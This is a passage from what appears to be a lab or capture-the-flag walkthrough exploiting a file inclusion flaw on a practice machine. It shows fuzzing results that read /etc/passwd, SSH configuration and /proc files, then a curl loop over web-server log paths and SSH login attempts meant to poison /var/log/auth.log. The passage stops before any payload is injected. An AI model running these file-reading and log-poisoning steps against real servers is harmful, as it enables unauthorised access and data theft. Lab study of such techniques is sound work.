+<span class="m">000000799</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">33</span><span class="w"> </span>L<span class="w">     </span><span class="m">165</span><span class="w"> </span>W<span class="w">      </span><span class="m">1235</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/default/grub&quot;</span>
+<span class="m">000000798</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">1</span><span class="w"> </span>W<span class="w">        </span><span class="m">11</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/debian_version&quot;</span>
+<span class="m">000000797</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">83</span><span class="w"> </span>L<span class="w">     </span><span class="m">485</span><span class="w"> </span>W<span class="w">      </span><span class="m">2969</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/debconf.conf&quot;</span>
+<span class="m">000000777</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">144</span><span class="w"> </span>L<span class="w">    </span><span class="m">207</span><span class="w"> </span>W<span class="w">      </span><span class="m">5889</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/ca-certificates.conf&quot;</span>
+<span class="m">000000769</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">71</span><span class="w"> </span>L<span class="w">     </span><span class="m">329</span><span class="w"> </span>W<span class="w">      </span><span class="m">2319</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/bash.bashrc&quot;</span>
+<span class="m">000000765</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">55</span><span class="w"> </span>L<span class="w">     </span><span class="m">351</span><span class="w"> </span>W<span class="w">      </span><span class="m">3018</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apt/sources.list&quot;</span>
+<span class="m">000000822</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">8</span><span class="w"> </span>L<span class="w">      </span><span class="m">43</span><span class="w"> </span>W<span class="w">       </span><span class="m">280</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/fuse.conf&quot;</span>
+<span class="m">000000830</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">1</span><span class="w"> </span>W<span class="w">        </span><span class="m">7</span><span class="w"> </span>Ch<span class="w">        </span><span class="s2">&quot;/etc/hostname&quot;</span>
+<span class="m">000000829</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">3</span><span class="w"> </span>L<span class="w">      </span><span class="m">18</span><span class="w"> </span>W<span class="w">       </span><span class="m">92</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/host.conf&quot;</span>
+<span class="m">000000828</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">138</span><span class="w"> </span>L<span class="w">    </span><span class="m">819</span><span class="w"> </span>W<span class="w">      </span><span class="m">4861</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/hdparm.conf&quot;</span>
+<span class="m">000000825</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">55</span><span class="w"> </span>L<span class="w">     </span><span class="m">55</span><span class="w"> </span>W<span class="w">       </span><span class="m">760</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/group-&quot;</span>
+<span class="m">000000823</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/group&quot;</span>
+<span class="m">000000815</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">11</span><span class="w"> </span>L<span class="w">     </span><span class="m">81</span><span class="w"> </span>W<span class="w">       </span><span class="m">625</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/fstab&quot;</span>
+<span class="m">000000898</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">10</span><span class="w"> </span>L<span class="w">     </span><span class="m">57</span><span class="w"> </span>W<span class="w">       </span><span class="m">411</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/hosts.allow&quot;</span>
+<span class="m">000000899</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">17</span><span class="w"> </span>L<span class="w">     </span><span class="m">111</span><span class="w"> </span>W<span class="w">      </span><span class="m">711</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/hosts.deny&quot;</span>
+<span class="m">000000897</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">7</span><span class="w"> </span>L<span class="w">      </span><span class="m">22</span><span class="w"> </span>W<span class="w">       </span><span class="m">186</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/hosts&quot;</span>
+<span class="m">000000954</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">36</span><span class="w"> </span>L<span class="w">     </span><span class="m">114</span><span class="w"> </span>W<span class="w">      </span><span class="m">703</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/logrotate.conf&quot;</span>
+<span class="m">000000953</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">341</span><span class="w"> </span>L<span class="w">    </span><span class="m">1753</span><span class="w"> </span>W<span class="w">     </span><span class="m">10550</span><span class="w"> </span>Ch<span class="w">    </span><span class="s2">&quot;/etc/login.defs&quot;</span>
+<span class="m">000000949</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">17</span><span class="w"> </span>L<span class="w">     </span><span class="m">40</span><span class="w"> </span>W<span class="w">       </span><span class="m">332</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/ldap/ldap.conf&quot;</span>
+<span class="m">000000948</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">2</span><span class="w"> </span>W<span class="w">        </span><span class="m">34</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/ld.so.conf&quot;</span>
+<span class="m">000000944</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">3</span><span class="w"> </span>W<span class="w">        </span><span class="m">17</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/issue.net&quot;</span>
+<span class="m">000000946</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">6</span><span class="w"> </span>L<span class="w">      </span><span class="m">22</span><span class="w"> </span>W<span class="w">       </span><span class="m">144</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/kernel-img.conf&quot;</span>
+<span class="m">000000943</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">5</span><span class="w"> </span>W<span class="w">        </span><span class="m">24</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/issue&quot;</span>
+<span class="m">000000939</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">355</span><span class="w"> </span>L<span class="w">    </span><span class="m">1050</span><span class="w"> </span>W<span class="w">     </span><span class="m">8181</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/init.d/apache2&quot;</span>
+<span class="m">000001006</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">20</span><span class="w"> </span>L<span class="w">     </span><span class="m">63</span><span class="w"> </span>W<span class="w">       </span><span class="m">513</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/nsswitch.conf&quot;</span>
+<span class="m">000000999</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">12</span><span class="w"> </span>W<span class="w">       </span><span class="m">91</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/networks&quot;</span>
+<span class="m">000000998</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">8</span><span class="w"> </span>L<span class="w">      </span><span class="m">39</span><span class="w"> </span>W<span class="w">       </span><span class="m">247</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/network/interfaces&quot;</span>
+<span class="m">000000983</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">33</span><span class="w"> </span>L<span class="w">     </span><span class="m">198</span><span class="w"> </span>W<span class="w">      </span><span class="m">2447</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/mtab&quot;</span>
+<span class="m">000000976</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">5</span><span class="w"> </span>L<span class="w">      </span><span class="m">36</span><span class="w"> </span>W<span class="w">       </span><span class="m">195</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/modules&quot;</span>
+<span class="m">000000969</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">131</span><span class="w"> </span>L<span class="w">    </span><span class="m">715</span><span class="w"> </span>W<span class="w">      </span><span class="m">5174</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/manpath.config&quot;</span>
+<span class="m">000000962</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">4</span><span class="w"> </span>L<span class="w">      </span><span class="m">6</span><span class="w"> </span>W<span class="w">        </span><span class="m">103</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/lsb-release&quot;</span>
+<span class="m">000001010</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">12</span><span class="w"> </span>L<span class="w">     </span><span class="m">17</span><span class="w"> </span>W<span class="w">       </span><span class="m">382</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/os-release&quot;</span>
+<span class="m">000001014</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/passwd&quot;</span>
+<span class="m">000000963</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">543</span><span class="w"> </span>L<span class="w">    </span><span class="m">1307</span><span class="w"> </span>W<span class="w">     </span><span class="m">14867</span><span class="w"> </span>Ch<span class="w">    </span><span class="s2">&quot;/etc/ltrace.conf&quot;</span>
+<span class="m">000001016</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">28</span><span class="w"> </span>L<span class="w">     </span><span class="m">38</span><span class="w"> </span>W<span class="w">       </span><span class="m">1487</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/passwd-&quot;</span>
+<span class="m">000001012</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">15</span><span class="w"> </span>L<span class="w">     </span><span class="m">59</span><span class="w"> </span>W<span class="w">       </span><span class="m">552</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/pam.conf&quot;</span>
+<span class="m">000001106</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">122</span><span class="w"> </span>L<span class="w">    </span><span class="m">802</span><span class="w"> </span>W<span class="w">      </span><span class="m">4620</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/access.conf&quot;</span>
+<span class="m">000001097</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">40</span><span class="w"> </span>L<span class="w">     </span><span class="m">117</span><span class="w"> </span>W<span class="w">      </span><span class="m">887</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/rpc&quot;</span>
+<span class="m">000001095</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">17</span><span class="w"> </span>L<span class="w">     </span><span class="m">111</span><span class="w"> </span>W<span class="w">      </span><span class="m">701</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/resolv.conf&quot;</span>
+<span class="m">000001069</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">97</span><span class="w"> </span>W<span class="w">       </span><span class="m">581</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/profile&quot;</span>
+<span class="m">000001122</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">11</span><span class="w"> </span>L<span class="w">     </span><span class="m">70</span><span class="w"> </span>W<span class="w">       </span><span class="m">419</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/security/sepermit.conf&quot;</span>
+<span class="m">000001151</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">122</span><span class="w"> </span>L<span class="w">    </span><span class="m">396</span><span class="w"> </span>W<span class="w">      </span><span class="m">3264</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/ssh/sshd_config&quot;</span>
+<span class="m">000001146</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">51</span><span class="w"> </span>L<span class="w">     </span><span class="m">218</span><span class="w"> </span>W<span class="w">      </span><span class="m">1580</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/ssh/ssh_config&quot;</span>
+<span class="m">000001123</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">65</span><span class="w"> </span>L<span class="w">     </span><span class="m">412</span><span class="w"> </span>W<span class="w">      </span><span class="m">2179</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/time.conf&quot;</span>
+<span class="m">000001119</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">73</span><span class="w"> </span>L<span class="w">     </span><span class="m">499</span><span class="w"> </span>W<span class="w">      </span><span class="m">2972</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/pam_env.conf&quot;</span>
+<span class="m">000001116</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">56</span><span class="w"> </span>L<span class="w">     </span><span class="m">347</span><span class="w"> </span>W<span class="w">      </span><span class="m">2150</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/limits.conf&quot;</span>
+<span class="m">000001117</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">28</span><span class="w"> </span>L<span class="w">     </span><span class="m">217</span><span class="w"> </span>W<span class="w">      </span><span class="m">1440</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/namespace.conf&quot;</span>
+<span class="m">000001112</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">106</span><span class="w"> </span>L<span class="w">    </span><span class="m">663</span><span class="w"> </span>W<span class="w">      </span><span class="m">3635</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/security/group.conf&quot;</span>
+<span class="m">000001160</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">77</span><span class="w"> </span>L<span class="w">     </span><span class="m">339</span><span class="w"> </span>W<span class="w">      </span><span class="m">2683</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/sysctl.conf&quot;</span>
+<span class="m">000001173</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">4</span><span class="w"> </span>L<span class="w">      </span><span class="m">45</span><span class="w"> </span>W<span class="w">       </span><span class="m">403</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/updatedb.conf&quot;</span>
+<span class="m">000001169</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">1</span><span class="w"> </span>W<span class="w">        </span><span class="m">20</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/timezone&quot;</span>
+<span class="m">000001161</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">3</span><span class="w"> </span>L<span class="w">      </span><span class="m">14</span><span class="w"> </span>W<span class="w">       </span><span class="m">77</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/etc/sysctl.d/10-console-messages.conf&quot;</span>
+<span class="m">000001162</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">12</span><span class="w"> </span>L<span class="w">     </span><span class="m">69</span><span class="w"> </span>W<span class="w">       </span><span class="m">509</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/sysctl.d/10-network-security.conf&quot;</span>
+<span class="m">000001308</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">6</span><span class="w"> </span>W<span class="w">        </span><span class="m">134</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/cmdline&quot;</span>
+<span class="m">000001314</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">5</span><span class="w"> </span>W<span class="w">        </span><span class="m">27</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/proc/loadavg&quot;</span>
+<span class="m">000001310</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">57</span><span class="w"> </span>L<span class="w">     </span><span class="m">112</span><span class="w"> </span>W<span class="w">      </span><span class="m">533</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/devices&quot;</span>
+<span class="m">000001322</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">3</span><span class="w"> </span>L<span class="w">      </span><span class="m">46</span><span class="w"> </span>W<span class="w">       </span><span class="m">450</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/net/tcp&quot;</span>
+<span class="m">000001326</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">0</span><span class="w"> </span>L<span class="w">      </span><span class="m">1</span><span class="w"> </span>W<span class="w">        </span><span class="m">27</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/proc/self/cmdline&quot;</span>
+<span class="m">000001324</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">5</span><span class="w"> </span>L<span class="w">      </span><span class="m">16</span><span class="w"> </span>W<span class="w">       </span><span class="m">116</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/partitions&quot;</span>
+<span class="m">000001321</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">3</span><span class="w"> </span>L<span class="w">      </span><span class="m">33</span><span class="w"> </span>W<span class="w">       </span><span class="m">384</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/net/route&quot;</span>
+<span class="m">000001323</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">28</span><span class="w"> </span>W<span class="w">       </span><span class="m">256</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/net/udp&quot;</span>
+<span class="m">000001320</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">42</span><span class="w"> </span>L<span class="w">     </span><span class="m">124</span><span class="w"> </span>W<span class="w">      </span><span class="m">1113</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/net/fib_trie&quot;</span>
+<span class="m">000001325</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">233</span><span class="w"> </span>L<span class="w">    </span><span class="m">1563</span><span class="w"> </span>W<span class="w">     </span><span class="m">17181</span><span class="w"> </span>Ch<span class="w">    </span><span class="s2">&quot;/proc/sched_debug&quot;</span>
+<span class="m">000001318</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">15</span><span class="w"> </span>W<span class="w">       </span><span class="m">158</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/net/arp&quot;</span>
+<span class="m">000001319</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">4</span><span class="w"> </span>L<span class="w">      </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">448</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/net/dev&quot;</span>
+<span class="m">000001317</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">33</span><span class="w"> </span>L<span class="w">     </span><span class="m">198</span><span class="w"> </span>W<span class="w">      </span><span class="m">2447</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/mounts&quot;</span>
+<span class="m">000001316</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">41</span><span class="w"> </span>L<span class="w">     </span><span class="m">246</span><span class="w"> </span>W<span class="w">      </span><span class="m">2119</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/modules&quot;</span>
+<span class="m">000001313</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">60</span><span class="w"> </span>L<span class="w">     </span><span class="m">220</span><span class="w"> </span>W<span class="w">      </span><span class="m">1586</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/ioports&quot;</span>
+<span class="m">000001315</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">48</span><span class="w"> </span>L<span class="w">     </span><span class="m">140</span><span class="w"> </span>W<span class="w">      </span><span class="m">1335</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/meminfo&quot;</span>
+<span class="m">000001312</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">68</span><span class="w"> </span>L<span class="w">     </span><span class="m">393</span><span class="w"> </span>W<span class="w">      </span><span class="m">3513</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/interrupts&quot;</span>
+<span class="m">000001309</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">28</span><span class="w"> </span>L<span class="w">     </span><span class="m">196</span><span class="w"> </span>W<span class="w">      </span><span class="m">1142</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/cpuinfo&quot;</span>
+<span class="m">000001311</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">32</span><span class="w"> </span>L<span class="w">     </span><span class="m">58</span><span class="w"> </span>W<span class="w">       </span><span class="m">383</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/filesystems&quot;</span>
+<span class="m">000001443</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">17</span><span class="w"> </span>W<span class="w">       </span><span class="m">146</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/version&quot;</span>
+<span class="m">000001442</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">10</span><span class="w"> </span>W<span class="w">       </span><span class="m">95</span><span class="w"> </span>Ch<span class="w">       </span><span class="s2">&quot;/proc/swaps&quot;</span>
+<span class="m">000001440</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">53</span><span class="w"> </span>L<span class="w">     </span><span class="m">129</span><span class="w"> </span>W<span class="w">      </span><span class="m">1260</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/self/status&quot;</span>
+<span class="m">000001441</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">9</span><span class="w"> </span>L<span class="w">      </span><span class="m">302</span><span class="w"> </span>W<span class="w">      </span><span class="m">774</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/stat&quot;</span>
+<span class="m">000001439</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">1</span><span class="w"> </span>L<span class="w">      </span><span class="m">52</span><span class="w"> </span>W<span class="w">       </span><span class="m">319</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/self/stat&quot;</span>
+<span class="m">000001438</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2</span><span class="w"> </span>L<span class="w">      </span><span class="m">15</span><span class="w"> </span>W<span class="w">       </span><span class="m">158</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/proc/self/net/arp&quot;</span>
+<span class="m">000001437</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">33</span><span class="w"> </span>L<span class="w">     </span><span class="m">198</span><span class="w"> </span>W<span class="w">      </span><span class="m">2447</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/proc/self/mounts&quot;</span>
+<span class="m">000001725</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">4</span><span class="w"> </span>L<span class="w">      </span><span class="m">36</span><span class="w"> </span>W<span class="w">       </span><span class="m">1513</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/usr/share/pixmaps/debian-logo.png&quot;</span>
+<span class="m">000001722</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">88</span><span class="w"> </span>L<span class="w">     </span><span class="m">467</span><span class="w"> </span>W<span class="w">      </span><span class="m">3028</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/usr/share/adduser/adduser.conf&quot;</span>
+<span class="m">000001824</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">683</span><span class="w"> </span>L<span class="w">    </span><span class="m">8253</span><span class="w"> </span>W<span class="w">     </span><span class="m">64983</span><span class="w"> </span>Ch<span class="w">    </span><span class="s2">&quot;/var/log/auth.log&quot;</span>
+<span class="m">000001827</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">2686</span><span class="w"> </span>L<span class="w">   </span><span class="m">32224</span><span class="w"> </span>W<span class="w">    </span><span class="m">250978</span><span class="w"> </span>Ch<span class="w">   </span><span class="s2">&quot;/var/log/auth.log.1&quot;</span>
+<span class="m">000002044</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">0</span><span class="w"> </span>L<span class="w">      </span><span class="m">1</span><span class="w"> </span>W<span class="w">        </span><span class="m">1152</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/var/run/utmp&quot;</span>
+</pre></div>
+</div>
+<p>Couldn’t find a log file to poison on the usual webserver logs locations</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>file<span class="k">)</span><span class="p">;</span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="p">;</span>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="w"> </span><span class="p">;</span><span class="k">done</span>
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache/error.log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/error_log
+</pre></div>
+</div>
+<p>But the ssh one can be leveraged</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>yaya@192.168.185.80<span class="w">                    </span>
+The<span class="w"> </span>authenticity<span class="w"> </span>of<span class="w"> </span>host<span class="w"> </span><span class="s1">&#39;192.168.185.80 (192.168.185.80)&#39;</span><span class="w"> </span>can<span class="s1">&#39;t be established.</span>
+<span class="s1">ED25519 key fingerprint is SHA256:oikisLZJ8r96QhcB1H0OEK18JfSIUhkZ4+MmhbRuA6Y.</span>
+<span class="s1">This key is not known by any other names.</span>
+<span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="s1">Warning: Permanently added &#39;</span><span class="m">192</span>.168.185.80<span class="s1">&#39; (ED25519) to the list of known hosts.</span>
+<span class="s1">yaya@192.168.185.80&#39;</span>s<span class="w"> </span>password:
+Permission<span class="w"> </span>denied,<span class="w"> </span>please<span class="w"> </span>try<span class="w"> </span>again.
+yaya@192.168.185.80<span class="s1">&#39;s password:</span>
+<span class="s1">Permission denied, please try again.</span>
+<span class="s1">yaya@192.168.185.80&#39;</span>s<span class="w"> </span>password:
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>/var/log/auth.log<span class="p">|</span>tail
+<span class="w">  </span>%<span class="w"> </span>Total<span class="w">    </span>%<span class="w"> </span>Received<span class="w"> </span>%<span class="w"> </span>Xferd<span class="w">  </span>Average<span class="w"> </span>Speed<span class="w">   </span>Time<span class="w">    </span>Time<span class="w">     </span>Time<span class="w">  </span>Current
+<span class="w">                                 </span>Dload<span class="w">  </span>Upload<span class="w">   </span>Total<span class="w">   </span>Spent<span class="w">    </span>Left<span class="w">  </span>Speed
+<span class="m">100</span><span class="w"> </span><span class="m">71650</span><span class="w">    </span><span class="m">0</span><span class="w"> </span><span class="m">71650</span><span class="w">    </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w">   </span>506k<span class="w">      </span><span class="m">0</span><span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w">  </span>507k
